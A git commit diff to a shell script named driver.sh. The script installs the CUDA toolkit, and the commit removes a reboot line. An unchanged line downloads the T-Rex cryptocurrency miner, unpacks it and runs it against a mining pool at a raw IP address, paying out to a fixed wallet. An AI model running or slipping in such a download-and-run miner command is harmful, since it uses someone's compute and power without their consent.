9001ca1c0d0ccc57bf25995b3ccc8abf79fdfc20
anhacvai11 <90373481+anhacvai11@users.noreply.github.com>
2024-11-01 11:37:46 +0700

    Update driver.sh

--- driver.sh
+++ driver.sh
@@ -5,7 +5,6 @@ wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/
 sudo apt install -y ./cuda-keyring_1.1-1_all.deb
 sudo apt update
 sudo apt -y install cuda-toolkit-12-5
-sudo reboot
 # chay miner 
 wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz ; tar xvzf t-rex-0.26.8-linux.tar.gz ; ./t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.PVM2
 done
